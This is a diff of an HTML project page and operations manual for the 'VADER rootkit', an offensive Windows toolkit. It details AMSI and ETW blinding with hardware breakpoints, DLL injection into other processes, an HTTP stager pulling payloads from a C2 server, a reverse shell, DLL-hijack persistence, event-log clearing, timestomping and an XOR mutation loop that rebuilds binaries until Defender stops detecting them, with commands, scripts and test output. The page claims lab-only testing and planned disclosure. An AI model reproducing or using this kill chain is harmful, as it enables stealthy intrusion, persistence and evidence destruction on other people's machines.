+      <tr>
+        <td>50</td>
+        <td>System-wide privilege escalation surface assessment &mdash; 20 sections, PE import analysis, phantom DLL discovery</td>
+        <td>recon/</td>
+        <td><span class="badge badge-cyan">AUDIT</span></td>
+      </tr>
+      <tr>
+        <td>51</td>
+        <td><strong>DLL injection + HWBP delivers process-wide AMSI/ETW blindness to any same-integrity process</strong></td>
+        <td>injection/</td>
+        <td><span class="badge badge-green">CONFIRMED</span></td>
+      </tr>
+      <tr>
+        <td>52</td>
+        <td>CREATE_SUSPENDED spawn &mdash; target process born blind before first instruction executes</td>
+        <td>injection/</td>
+        <td><span class="badge badge-green">CONFIRMED</span></td>
+      </tr>
+      <tr>
+        <td>53</td>
+        <td>VdrWatch periodic thread re-enumeration &mdash; new threads auto-armed within 2s</td>
+        <td>injection/</td>
+        <td><span class="badge badge-green">CONFIRMED</span></td>
+      </tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ════════════ SECTION 09: ROOTKIT ════════════ -->
+<section id="rootkit">
+  <div class="section-header">
+    <div class="section-number">Section 09</div>
+    <h2 class="section-title">Rootkit &mdash; Final Conclusions</h2>
+  </div>
+  <div class="prose">
+    <p>
+      All phases operational. The VADER rootkit is a complete kill chain &mdash; from automated reconnaissance
+      through telemetry blinding, process injection, privilege escalation, staged delivery, and post-operation
+      cleanup. Every component compiles clean against Defender RTP on Windows 11 24H2. Every component has
+      been tested with real evidence on researcher-owned hardware. The auto-mutation pipeline ensures
+      signatures never persist long enough to matter.
+    </p>
+  </div>
+
+  <h3>Phase 4: Process Injection (HOTEL)</h3>
+  <div class="card">
+    <table>
+      <thead><tr><th>Component</th><th>Purpose</th><th>Technique</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><code>vader_inject.dll</code></td>
+          <td>Injection payload &mdash; HWBP on all threads</td>
+          <td>VEH handler + DR0/DR1 via thread enumeration (CreateToolhelp32Snapshot)</td>
+        </tr>
+        <tr>
+          <td><code>vader_inject.exe</code></td>
+          <td>Injector &mdash; PID or CREATE_SUSPENDED</td>
+          <td>Classic DLL injection: VirtualAllocEx &rarr; WriteProcessMemory &rarr; CreateRemoteThread(LoadLibraryA)</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Kill Chain Evidence</h3>
+  <div class="card">
+    <table>
+      <thead><tr><th>Test</th><th>Result</th><th>Evidence</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>Dark Room self-test</td>
+          <td><span class="badge badge-green">AMSI+ETW BLIND</span></td>
+          <td>E_INVALIDARG (0x80070057) + STATUS_SUCCESS (0x00)</td>
+        </tr>
+        <tr>
+          <td>PID injection</td>
+          <td><span class="badge badge-green">AMSI BLIND</span></td>
+          <td>Microsoft AMSI test string passed through Invoke-Expression undetected</td>
+        </tr>
+        <tr>
+          <td>CREATE_SUSPENDED spawn</td>
+          <td><span class="badge badge-green">INJECTION CLEAN</span></td>
+          <td>Canary: &ldquo;loaded - HWBP armed&rdquo; + &ldquo;watchdog started&rdquo;</td>
+        </tr>
+        <tr>
+          <td>AmsiUtils reflection</td>
+          <td><span class="badge badge-green">BLIND</span></td>
+          <td>System.Management.Automation.AmsiUtils accessible via reflection</td>
+        </tr>
+        <tr>
+          <td>Defender static scan</td>
+          <td><span class="badge badge-green">CLEAN</span></td>
+          <td>Start-MpScan: no detections for DLL or EXE</td>
+        </tr>
+        <tr>
+          <td>Defender runtime (10 min)</td>
+          <td><span class="badge badge-green">ZERO DETECTIONS</span></td>
+          <td>Get-MpThreatDetection: empty result set</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Dark Room vs Inject &mdash; Capability Comparison</h3>
+  <div class="card">
+    <table>
+      <thead><tr><th>Capability</th><th>Dark Room (self)</th><th>Inject (remote)</th></tr></thead>
+      <tbody>
+        <tr><td>Target</td><td>Own process only</td><td>Any same-integrity process</td></tr>
+        <tr><td>Thread coverage</td><td>Single thread (caller)</td><td>All threads + watchdog re-enum</td></tr>
+        <tr><td>AMSI blind</td><td>Caller thread only</td><td>Process-wide (every thread)</td></tr>
+        <tr><td>ETW blind</td><td>Caller thread only</td><td>Process-wide (every thread)</td></tr>
+        <tr><td>New thread handling</td><td>Not covered</td><td>VdrWatch (2s periodic scan)</td></tr>
+        <tr><td>CREATE_SUSPENDED</td><td>Not applicable</td><td>Blind before first instruction</td></tr>
+        <tr><td>Loader lock safety</td><td>N/A (no DllMain)</td><td>Toolhelp32 + kernel calls only</td></tr>
+        <tr><td>Signature set</td><td>ALPHA (0x41)</td><td>HOTEL (0x77)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Why Defender Cannot See This</h3>
+  <div class="card">
+    <p>Four layers of invisibility compound to make hardware breakpoint injection undetectable
+       by Windows Defender in its current architecture:</p>
+    <ol style="margin: 1rem 0 0 1.5rem; line-height: 2;">
+      <li><strong>No memory modification.</strong> amsi.dll and ntdll.dll remain byte-identical.
+          Tamper Protection checks memory integrity &mdash; nothing to find.</li>
+      <li><strong>No VirtualProtect.</strong> Code pages keep their original protection flags.
+          WdFilter.sys EtwTi telemetry for page protection changes never fires.</li>
+      <li><strong>CPU debug registers are per-thread kernel state.</strong> DR0&ndash;DR3 and DR7 are
+          only accessible via Get/SetThreadContext. There is no kernel callback,
+          no ETW provider, and no Defender hook that monitors debug register changes.</li>
+      <li><strong>VEH is user-mode process-local.</strong> AddVectoredExceptionHandler modifies
+          an in-process linked list. No cross-process notification exists.</li>
+    </ol>
+  </div>
+
+  <h3>Complete Kill Chain</h3>
+  <div class="card">
+    <pre style="color: var(--green); line-height: 1.8; font-size: 0.85rem;">
+  RECON                  vader_recon.ps1 (20-section scan + PE parser)
+    &darr;                      Identify writable paths, phantom DLLs, services
+  STAGE                  vader_stager.exe &larr; vader_serve.py (HTTP C2)
+    &darr;                      Fetch dark_room + inject payloads over HTTP
+  DARK ROOM              dark_room.exe --test (verify AMSI+ETW bypass)
+    &darr;                      Confirm HWBP technique operational
+  INJECT                 vader_inject.exe --spawn (CREATE_SUSPENDED)
+    &darr;                      DLL injection: all threads blinded before PS init
+  BLIND SHELL            PowerShell with AMSI+ETW disabled process-wide
+    &darr;                      Run any script without detection
+  PRIVESC                v6 path hijack / v7 phantom DLL (persistence)
+    &darr;                      DLL planted in writable PATH or phantom import
+  CANARY                 inject_status.log [HOTEL] + vector canary
+    &darr;                      Confirm payload execution
+  C2                     vader_shell reverse connection
+    &darr;                      Full operator access, Defender blind
+  CLEANUP                vader_clean.exe (canaries, logs, prefetch, timestomp)
+    &darr;                      Post-op evidence removal, self-delete on reboot
+  MUTATE                 mutate.py (rotate XOR keys, recompile, rescan)
+                         Signatures invalidated, ready for next engagement</pre>
+  </div>
+
+  <h3>Responsible Disclosure</h3>
+  <div class="card">
+    <p>The hardware breakpoint blind spot (Finding #36) represents a fundamental architectural
+       gap in Windows Defender&rsquo;s monitoring capabilities. Debug register modifications via
+       SetThreadContext generate no telemetry, no callback, and no alert. This has been
+       documented for potential MSRC submission under the responsible disclosure framework.</p>
+    <p style="margin-top: 0.75rem;">All testing conducted on researcher-owned hardware.
+       No third-party systems targeted. Repository private for OPSEC.</p>
+  </div>
+</section>
+
+<!-- ════════════ SECTION 10: AUTO-MUTATION ════════════ -->
+<section id="mutation">
+  <div class="section-header">
+    <div class="section-number">Section 10</div>
+    <h2 class="section-title">Auto-Mutation Pipeline</h2>
+  </div>
+
+  <div class="prose">
+    <p>
+      Static signatures are brittle. A single XOR key change renders every string-based detection rule obsolete. The auto-mutation pipeline (<code>mutate.py</code>) automates the full cycle: decode all XOR-encoded strings with the current key, re-encode with a fresh random key, patch the source files, recompile, scan against Defender, and retry with a different key if detected.
+    </p>
+    <p>
+      This transforms evasion from a manual craft into an <strong>automated loop</strong>. The operator never touches a hex editor. The pipeline handles 8 independent components, each with its own XOR signature isolation.
+    </p>
+  </div>
+
+  <div class="card">
+    <div class="card-title">XOR Signature Isolation</div>
+    <table>
+      <thead>
+        <tr>
+          <th>Component</th>
+          <th>Callsign</th>
+          <th>XOR Key</th>
+          <th>Strings Encoded</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Dark Room</td>
+          <td>ALPHA</td>
+          <td><code>0x41</code></td>
+          <td>amsi.dll, AmsiScanBuffer, ntdll.dll, EtwEventWrite</td>
+        </tr>
+        <tr>
+          <td>V4 Svc Replace</td>
+          <td>DELTA</td>
+          <td><code>0x52</code></td>
+          <td>Service paths, canary paths, registry keys</td>
+        </tr>
+        <tr>
+          <td>V6 Path Hijack</td>
+          <td>FOXTROT</td>
+          <td><code>0x63</code></td>
+          <td>DLL names, canary paths, export names</td>
+        </tr>
+        <tr>
+          <td>V7 Phantom DLL</td>
+          <td>GOLF</td>
+          <td><code>0x19</code></td>
+          <td>Target DLL names, Office paths, canary paths</td>
+        </tr>
+        <tr>
+          <td>Injection DLL+EXE</td>
+          <td>HOTEL</td>
+          <td><code>0x77</code></td>
+          <td>amsi.dll, ntdll.dll, kernel32.dll, canary paths</td>
+        </tr>
+        <tr>
+          <td>HTTP Stager</td>
+          <td>INDIA</td>
+          <td><code>0x88</code></td>
+          <td>C2 URLs, endpoint paths, WinHTTP strings</td>
+        </tr>
+        <tr>
+          <td>Anti-Forensics</td>
+          <td>JULIET</td>
+          <td><code>0x93</code></td>
+          <td>Canary paths, event log names, prefetch patterns</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Mutation Cycle</h3>
+  <ol class="attack-steps">
+    <li>Parse all 8 C source files &mdash; locate XOR arrays and key constants via regex</li>
+    <li>Decode each array with the current key, producing cleartext strings</li>
+    <li>Generate a new random key (0x01&ndash;0xFE), re-encode all strings</li>
+    <li>Patch the source: update array bytes, update <code>XOR_KEY</code> constant</li>
+    <li>Recompile the patched source with <code>cl.exe</code> using original flags</li>
+    <li>Scan the new binary against Defender (<code>MpCmdRun -Scan -ScanType 3</code>)</li>
+    <li>If <span class="highlight">CLEAN</span> &mdash; done. If <span class="highlight-amber">DETECTED</span> &mdash; restore source, retry with a different key (up to 10 attempts)</li>
   </ol>
 
-  <h3>Dark Room Fails</h3>
-
-  <p><strong>Symptom:</strong> <code>dark_room.exe --test</code> does not show <code>AMSI: BLIND</code>.</p>
-
-  <p><strong>Check 1: Are addresses resolved?</strong><br>
-  The output should show non-zero addresses for <code>AmsiScanBuffer</code> and <code>EtwEventWrite</code>. If they're <code>0x0</code>:</p>
-  <ul>
-    <li><code>amsi.dll</code> may not be loaded. Run from a context where <a class="xref" href="#learn-ch6">AMSI</a> is active (e.g., PowerShell).</li>
-    <li><code>EtwEventWrite</code> is in <code>ntdll.dll</code> &mdash; should always be available.</li>
-  </ul>
-
-  <p><strong>Check 2: Is a debugger attached?</strong><br>
-  <a class="xref" href="#learn-ch7">Hardware breakpoints</a> conflict with debuggers. If you have x64dbg/WinDbg attached, detach first.</p>
-
-  <p><strong>Check 3: Are <a class="xref" href="#learn-ch7">debug registers</a> already in use?</strong><br>
-  Another security tool may be using <a class="xref" href="#learn-ch7">DR0-DR3</a>. Check:</p>
-
-<pre><code>:: From PowerShell (elevated not required):
-dark_room.exe --check</code></pre>
-
-  <p>If <a class="xref" href="#learn-ch7">DR0</a> or <a class="xref" href="#learn-ch7">DR1</a> are already set, something else claimed them. This is rare on consumer Windows.</p>
-
-  <p><strong>Check 4: Is VEH installed?</strong><br>
-  If the breakpoint fires but no handler catches it, the process crashes (STATUS_SINGLE_STEP exception). The <code>--test</code> flag handles this, but if you're modifying the code, ensure <code>AddVectoredExceptionHandler</code> is called BEFORE setting <a class="xref" href="#learn-ch7">DR0/DR1</a>.</p>
-
-  <h3>Canary File Not Created</h3>
-
-  <p><strong>Symptom:</strong> After triggering a vector, the canary file doesn't appear.</p>
-
-  <p><strong>Check 1: Did the trigger actually fire?</strong></p>
-  <ul>
-    <li>V7: Check if ClickToRunSvc restarted: <code>sc query ClickToRunSvc</code></li>
-    <li>V4: Check if the service restarted: <code>sc query WsNativePushService</code></li>
-    <li>V6: Check if the target service ran</li>
-  </ul>
-
-  <p><strong>Check 2: Is the DLL/EXE in the right path?</strong></p>
-
-<pre><code>:: V7
-dir "%USERPROFILE%\.local\bin\osppc.dll"
-
-:: V4
-dir "C:\Users\%USERNAME%\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe"</code></pre>
-
-  <p><strong>Check 3: Is PATH configured?</strong><br>
-  For V6/V7, the user's <code>.local\bin</code> must be in the machine PATH (not just user PATH for SYSTEM services).</p>
-
-<pre><code>echo %PATH% | findstr ".local\bin"</code></pre>
-
-  <p><strong>Check 4: File permissions?</strong></p>
-
-<pre><code>icacls C:\Windows\Temp</code></pre>
-
-  <p>SYSTEM should have write access to <code>C:\Windows\Temp</code>. If this is locked down (non-default), the canary write fails but the payload still executed &mdash; you just can't see the evidence.</p>
-
-  <h3>C2 Listener: No Callback</h3>
-
-  <p><strong>Symptom:</strong> Shell vector deployed but no reverse shell connection.</p>
-
-  <p><strong>Check 1: Is the listener running?</strong></p>
-
-<pre><code>netstat -an | findstr "4444"</code></pre>
-
-  <p>Should show LISTENING on <code>0.0.0.0:4444</code> or your IP.</p>
-
-  <p><strong>Check 2: Firewall?</strong><br>
-  Windows Firewall may block inbound connections.</p>
-
-<pre><code>:: Check if the port is allowed
-netsh advfirewall firewall show rule name=all | findstr "4444"</code></pre>
-
-  <p><strong>Check 3: Is the IP correct in the payload?</strong><br>
-  The shell binary has a hardcoded C2 IP/port. If you compiled with the wrong IP, it's connecting to nowhere. Verify by checking the source or decompiling.</p>
-
-  <p><strong>Check 4: Is <a class="xref" href="#learn-ch1">Defender</a> blocking the shell itself?</strong><br>
-  Run <code>scan_all.py</code> and check if <code>vader_shell.exe</code> is CLEAN. If it's DETECTED, the shell got signatured &mdash; rebuild with new <a class="xref" href="#learn-ch3">XOR</a> key.</p>
-
-  <h3>Compile Errors</h3>
-
-  <p><strong><code>cl.exe is not recognized</code>:</strong> Run <code>vcvars64.bat</code> first.<br>
-  <strong><code>cannot open source file</code>:</strong> Check the path. Are you in the repo root?<br>
-  <strong><code>unresolved external symbol</code>:</strong> Missing a library. Add to <code>/link</code>: <code>advapi32.lib</code>, <code>user32.lib</code>, <code>ws2_32.lib</code>, <code>ntdll.lib</code> as needed.<br>
-  <strong><code>/GS- warning</code>:</strong> This is expected. We disable stack cookies intentionally for size optimisation.</p>
-
-  <hr>
-
-  <!-- Section 6: Cleanup -->
-  <h2 id="exec-cleanup">6. Cleanup</h2>
-
-  <p>After testing, remove all evidence:</p>
-
-<pre><code>:: Remove deployed DLLs
-del "%USERPROFILE%\.local\bin\osppc.dll" 2>nul
-del "%USERPROFILE%\.local\bin\*.dll" 2>nul
-
-:: Remove canary files
-del C:\Windows\Temp\osp_telemetry.log 2>nul
-del C:\Windows\Temp\svc_health.log 2>nul
-del C:\Windows\Temp\hwmon_diag.log 2>nul
-del C:\Windows\Temp\ver_cache.log 2>nul
-
-:: Restore V4 original (if used)
-:: ren "...\WsNativePushService_real.exe" WsNativePushService.exe
-
-:: Remove compiled binaries from repo root
-del dark_room.exe 2>nul
-del osppc.dll 2>nul
-del *.exe 2>nul
-del *.dll 2>nul
-del *.obj 2>nul</code></pre>
-
-  <hr>
-
-  <!-- Section 7: New Target -->
-  <h2 id="exec-newtarget">7. Setting Up a New Target Machine</h2>
-
-  <p>When you get a new machine (RADON laptop, test rig, etc.):</p>
-
-  <h3>Step 1: Baseline the Machine</h3>
-
-<pre><code>:: What OS version?
-ver
-systeminfo | findstr /i "OS"
-
-:: What's Defender's version?
-powershell -c "Get-MpComputerStatus | Select-Object AMProductVersion, AntivirusSignatureVersion, AntivirusSignatureLastUpdated"
-
-:: What's the user context?
-whoami /all</code></pre>
-
-  <h3>Step 2: Clone the Repo</h3>
-
-<pre><code>git clone https://github.com/rainfantry/vader-rootkit.git
-cd vader-rootkit</code></pre>
-
-  <h3>Step 3: Install Compiler</h3>
-
-  <p>Install Visual Studio Community with "Desktop development with C++" workload. Verify:</p>
-
-<pre><code>call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
-cl.exe</code></pre>
-
-  <h3>Step 4: Run Pre-Flight</h3>
-
-  <p>Follow <a class="xref" href="#exec-preflight">Section 1</a> of this manual from the top.</p>
-
-  <h3>Step 5: Run Recon</h3>
-
-<pre><code>python deploy.py --recon</code></pre>
-
-  <p>This tells you which vectors are viable on this specific machine. Not every machine has Wondershare (V4) or Office (V7).</p>
-
-  <h3>Step 6: Adapt and Execute</h3>
-
-  <p>Based on recon results, choose your vector and follow the <a class="xref" href="#exec-killchain">Phase 3</a> instructions above.</p>
-
-  <h3>Step 7: Document</h3>
-
-  <p>Log every test run in <code>ENGAGEMENT_LOG.md</code> with:</p>
-  <ul>
-    <li>Date, target machine, OS build</li>
-    <li>Vector used</li>
-    <li><a class="xref" href="#learn-ch1">Defender</a> version at time of test</li>
-    <li>Result (canary content, screenshots)</li>
-    <li>Any detections or failures</li>
-  </ul>
-
-  <hr>
-
-  <!-- Appendix A -->
-  <h2 id="exec-appendix-a">Appendix A: File Reference</h2>
-
-  <table>
-    <thead>
-      <tr><th>File</th><th>Purpose</th></tr>
-    </thead>
-    <tbody>
-      <tr><td><code><a class="xref" href="#exec-quickstart">deploy.py</a></code></td><td>Automated <a class="xref" href="#learn-ch10">kill chain</a> orchestrator</td></tr>
-      <tr><td><code>tests/scan_all.py</code></td><td>Detection status scanner (copies to temp, scans, reports)</td></tr>
-      <tr><td><code>dark_room/dark_room_annotated.c</code></td><td>Combined <a class="xref" href="#learn-ch6">AMSI+ETW</a> <a class="xref" href="#learn-ch7">HWBP</a> bypass</td></tr>
-      <tr><td><code>shell/vader_shell_annotated.c</code></td><td><a class="xref" href="#learn-ch3">XOR</a>-obfuscated reverse shell</td></tr>
-      <tr><td><code>shell/vader_listener.py</code></td><td>C2 listener + payload configurator</td></tr>
-      <tr><td><code>recon/vader_recon.ps1</code></td><td>17-section target reconnaissance</td></tr>
-      <tr><td><code>vectors/v4_svc_replace/svc_replace_annotated.c</code></td><td>Service binary replacement</td></tr>
-      <tr><td><code>vectors/v5_dll_proxy/version_proxy_annotated.c</code></td><td>VERSION.dll proxy sideload</td></tr>
-      <tr><td><code>vectors/v6_path_hijack/path_hijack_dll_annotated.c</code></td><td>Generic PATH DLL plant</td></tr>
-      <tr><td><code>vectors/v7_phantom_dll/phantom_dll_annotated.c</code></td><td>Phantom DLL (osppc.dll / ClickToRunSvc)</td></tr>
-      <tr><td><code>OPERATIONS_MANUAL.md</code></td><td>Vector-by-vector reference</td></tr>
-      <tr><td><code>FINDINGS.md</code></td><td>Findings #31-#50</td></tr>
-      <tr><td><code>ENGAGEMENT_LOG.md</code></td><td>13 engagements documented</td></tr>
-    </tbody>
-  </table>
-
-  <!-- Appendix B -->
-  <h2 id="exec-appendix-b">Appendix B: XOR Key Quick Reference</h2>
-
-  <table>
-    <thead>
-      <tr><th>Vector</th><th>Current Key</th><th>Canary Path</th></tr>
-    </thead>
-    <tbody>
-      <tr><td>V1-V3 (Evasion)</td><td><code>0x41</code></td><td>N/A (process-local)</td></tr>
-      <tr><td>V4 DELTA</td><td><code>0x52</code></td><td><code>C:\Windows\Temp\svc_health.log</code></td></tr>
-      <tr><td>V5 ECHO</td><td><code>0x37</code></td><td><code>C:\Windows\Temp\ver_cache.log</code></td></tr>
-      <tr><td>V6 FOXTROT</td><td><code>0x63</code></td><td><code>C:\Windows\Temp\hwmon_diag.log</code></td></tr>
-      <tr><td>V7 GOLF</td><td><code>0x19</code></td><td><code>C:\Windows\Temp\osp_telemetry.log</code></td></tr>
-    </tbody>
-  </table>
-
-  <p>When rotating a key, pick ANY byte <code>0x01</code>-<code>0xFF</code> except the current key. Generate new encoded strings:</p>
-
-<pre><code>key = 0xNN  # your new key
-for s in ["string1", "string2", ...]:
-    encoded = ", ".join(f"0x{b ^ key:02X}" for b in s.encode())
-    print(f'// "{s}"')
-    print(f"unsigned char enc[] = {{{encoded}, 0x{0 ^ key:02X}}};")
-</code></pre>
-
-  <p style="color:var(--dim); font-size:0.78rem; margin-top:2rem; font-style:italic;">VADER ROOTKIT &mdash; 22DIV / george wu &mdash; CSEC Tactical Cyber Operations</p>
-
-
-  <!-- ── FOOTER ── -->
-  <footer>
-    <div>george wu / 22DIV</div>
-    <div style="margin-top: 0.3rem;">
-      <a href="index.html">22DIV Home</a>
-      <span class="sep">|</span>
-      <a href="https://github.com/rainfantry/vader-rootkit">vader-rootkit</a>
-      <span class="sep">|</span>
-      <a href="https://github.com/rainfantry">GitHub</a>
+  <h3>Why It Works</h3>
+  <div class="card">
+    <div class="prose">
+      <p>
+        Defender's static engine relies on byte-pattern signatures. XOR encoding with any non-zero key transforms every byte in the string. A key change from <code>0x41</code> to <code>0xB7</code> produces a completely different byte sequence for the same cleartext &mdash; no signature matches. The strings are decoded at runtime into stack buffers, never appearing in the binary's static content.
+      </p>
+      <p>
+        Each component uses an <strong>independent key</strong>. Burning one component's signature does not compromise the others. The mutation pipeline can target a single component or rotate all 8 simultaneously.
+      </p>
     </div>
-    <div class="tagline">signature evasion // polymorphism // process injection // kill chain execution</div>
-  </footer>
+  </div>
+</section>
 
-</div>
+<!-- ════════════ SECTION 11: STAGER ════════════ -->
+<section id="stager">
+  <div class="section-header">
+    <div class="section-number">Section 11</div>
+    <h2 class="section-title">HTTP Stager &mdash; INDIA (0x88)</h2>
+  </div>
+
+  <div class="prose">
+    <p>
+      The stager eliminates the manual file-copy gap. Instead of transferring binaries via USB or share, the stager fetches payloads from a C2 server over HTTP using the WinHTTP API. All strings &mdash; URLs, endpoints, function names &mdash; are XOR-encoded. The stager writes a canary on execution, downloads the payload, executes it, and cleans up after itself.
+    </p>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Architecture</div>
+    <table>
+      <thead>
+        <tr>
+          <th>Component</th>
+          <th>Purpose</th>
+          <th>Detail</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>vader_stager.exe</code></td>
+          <td>Download cradle</td>
+          <td>WinHTTP chain: Open &rarr; Connect &rarr; OpenRequest &rarr; SendRequest &rarr; ReceiveResponse &rarr; ReadData</td>
+        </tr>
+        <tr>
+          <td><code>vader_serve.py</code></td>
+          <td>C2 file server</td>
+          <td>4 endpoints: <code>/dark_room</code>, <code>/inject_dll</code>, <code>/inject_exe</code>, <code>/shell</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Delivery Chain</h3>
+  <ol class="attack-steps">
+    <li>Operator starts <code>vader_serve.py</code> on C2 machine &mdash; serves payloads on configurable port</li>
+    <li>Stager executes on target &mdash; writes canary with <code>[INDIA]</code> tag for evidence logging</li>
+    <li>WinHTTP fetches <code>/dark_room</code> endpoint &mdash; receives dark_room.exe payload</li>
+    <li>Optional <code>--inject</code> flag fetches injection components (<code>/inject_dll</code> + <code>/inject_exe</code>)</li>
+    <li>Downloaded payloads execute &mdash; dark room blinds the process, injection propagates to targets</li>
+    <li>Stager cleans up temporary files and optionally self-deletes</li>
+  </ol>
+
+  <h3>MITRE ATT&amp;CK</h3>
+  <div class="card">
+    <table>
+      <thead><tr><th>Technique</th><th>ID</th><th>Implementation</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>Ingress Tool Transfer</td>
+          <td>T1105</td>
+          <td>WinHTTP download from operator-controlled C2</td>
+        </tr>
+        <tr>
+          <td>Application Layer Protocol</td>
+          <td>T1071.001</td>
+          <td>HTTP GET requests to fetch staged payloads</td>
+        </tr>
+        <tr>
+          <td>Obfuscated Files</td>
+          <td>T1027</td>
+          <td>All strings XOR-encoded (key 0x88), runtime decode to stack</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ════════════ SECTION 12: ANTI-FORENSICS ════════════ -->
+<section id="forensics">
+  <div class="section-header">
+    <div class="section-number">Section 12</div>
+    <h2 class="section-title">Anti-Forensics &mdash; JULIET (0x93)</h2>
+  </div>
+
+  <div class="prose">
+    <p>
+      Post-operation cleanup. After the kill chain executes, evidence remains: canary files, Windows event logs, prefetch entries, file timestamps. The anti-forensics tool (<code>vader_clean.exe</code>) systematically removes this evidence in 5 phases, with privilege-aware execution &mdash; standard user cleans what it can, SYSTEM cleans everything.
+    </p>
+  </div>
+
+  <h3>Cleanup Phases</h3>
+  <div class="card">
+    <table>
+      <thead>
+        <tr>
+          <th>Phase</th>
+          <th>Operation</th>
+          <th>Requires</th>
+          <th>Technique</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>1</td>
+          <td>Delete canary files (all 6 vectors)</td>
+          <td>Standard user</td>
+          <td>DeleteFileA on known canary paths</td>
+        </tr>
+        <tr>
+          <td>2</td>
+          <td>Clear event logs (PowerShell, Sysmon, Security, Application)</td>
+          <td>SYSTEM / Admin</td>
+          <td>EvtClearLog via dynamically resolved wevtapi.dll</td>
+        </tr>
+        <tr>
+          <td>3</td>
+          <td>Delete prefetch files (DARK_ROOM, VADER_INJECT, VADER_STAGER, VADER_CLEAN)</td>
+          <td>SYSTEM / Admin</td>
+          <td>FindFirstFileA pattern match in <code>C:\Windows\Prefetch</code></td>
+        </tr>
+        <tr>
+          <td>4</td>
+          <td>Timestomp files (match kernel32.dll timestamps)</td>
+          <td>File owner</td>
+          <td>SetFileTime matching kernel32.dll creation/modification/access times</td>
+        </tr>
+        <tr>
+          <td>5</td>
+          <td>Self-delete on reboot</td>
+          <td>SYSTEM / Admin</td>
+          <td>MoveFileExA with MOVEFILE_DELAY_UNTIL_REBOOT</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Dynamic API Resolution</h3>
+  <div class="card">
+    <div class="prose">
+      <p>
+        Event log clearing uses <code>EvtClearLog</code> from <code>wevtapi.dll</code>, but this function is <strong>not linked at compile time</strong>. The binary loads wevtapi.dll at runtime via <code>LoadLibraryA</code> and resolves <code>EvtClearLog</code> via <code>GetProcAddress</code>. This avoids an import table entry that static analysis would flag.
+      </p>
+      <p>
+        Both the DLL name and function name are XOR-encoded (key <code>0x93</code>). The binary's import table shows no reference to event log APIs.
+      </p>
+    </div>
+  </div>
+
+  <h3>MITRE ATT&amp;CK</h3>
+  <div class="card">
+    <table>
+      <thead><tr><th>Technique</th><th>ID</th><th>Implementation</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>Indicator Removal</td>
+          <td>T1070</td>
+          <td>Multi-phase evidence cleanup across all VADER artifacts</td>
+        </tr>
+        <tr>
+          <td>Clear Windows Event Logs</td>
+          <td>T1070.001</td>
+          <td>EvtClearLog via dynamically resolved wevtapi.dll &mdash; 4 log channels</td>
+        </tr>
+        <tr>
+          <td>File Deletion</td>
+          <td>T1070.004</td>
+          <td>Canary files (6 paths) and prefetch entries (4 patterns)</td>
+        </tr>
+        <tr>
+          <td>Timestomp</td>
+          <td>T1070.006</td>
+          <td>SetFileTime matching kernel32.dll &mdash; blends with OS install date</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Operational Use</h3>
+  <div class="evidence-block">C:\vader-rootkit> forensics\vader_clean.exe --dry-run
+  [JULIET] DRY RUN — showing what would be cleaned
+
+  PHASE 1: CANARY CLEANUP
+    [WOULD DELETE] C:\Windows\Temp\inject_status.log
+    [WOULD DELETE] C:\Windows\Temp\svc_health.log
+    [WOULD DELETE] C:\Windows\Temp\osp_telemetry.log
+    [SKIP] C:\Windows\Temp\hwmon_diag.log (not found)
+
+  PHASE 2: EVENT LOG CLEANUP (requires SYSTEM)
+    [WOULD CLEAR] Microsoft-Windows-PowerShell/Operational
+    [WOULD CLEAR] Microsoft-Windows-Sysmon/Operational
+    [WOULD CLEAR] Security
+    [WOULD CLEAR] Application
+
+  PHASE 3: PREFETCH CLEANUP (requires SYSTEM)
+    [WOULD DELETE] C:\Windows\Prefetch\DARK_ROOM*.pf
+    [WOULD DELETE] C:\Windows\Prefetch\VADER_INJECT*.pf
+
+  PHASE 4: TIMESTOMP
+    [WOULD MATCH] timestamps to kernel32.dll reference
+
+  PHASE 5: SELF-DELETE (--self flag)
+    [SKIP] --self not specified</div>
+</section>
+
+</main>
+
+<!-- ────────────── FOOTER ────────────── -->
+<footer>
+  <div class="footer-brand">george wu / 22DIV</div>
+  <div class="footer-sub">CSEC &mdash; Tactical Cyber Operations</div>
+  <div class="footer-sub" style="margin-top: 0.4rem; color: var(--text-dim);">Responsible Disclosure via MSRC</div>
+</footer>
+
+<!-- ────────────── SMOOTH SCROLL + NAV HIGHLIGHT ────────────── -->
+<script>
+(function() {
+  // Active nav link highlighting on scroll
+  const sections = document.querySelectorAll('section[id]');
+  const navLinks = document.querySelectorAll('.nav-links a');
+
+  function highlightNav() {
+    let scrollPos = window.scrollY + 120;
+    sections.forEach(function(section) {
+      let top = section.offsetTop;
+      let bottom = top + section.offsetHeight;
+      let id = section.getAttribute('id');
+      navLinks.forEach(function(link) {
+        if (link.getAttribute('href') === '#' + id) {
+          if (scrollPos >= top && scrollPos < bottom) {
+            link.style.color = '#00ff41';
+          } else {
+            link.style.color = '';
+          }
+        }
+      });
+    });
+  }
+
+  window.addEventListener('scroll', highlightNav, { passive: true });
+  highlightNav();
+
+  // Typing effect on hero title
+  var title = document.querySelector('.hero h1');
+  var cursor = title.querySelector('.cursor');
+  var text = 'OPERATION VADER';
+  title.textContent = '';
+  var i = 0;
+
+  function typeChar() {
+    if (i < text.length) {
+      title.textContent += text.charAt(i);
+      title.appendChild(cursor);
+      i++;
+      setTimeout(typeChar, 80 + Math.random() * 40);
+    }
+  }
+
+  // Start typing after a brief delay
+  setTimeout(typeChar, 400);
+})();
+</script>
 
 </body>
 </html>
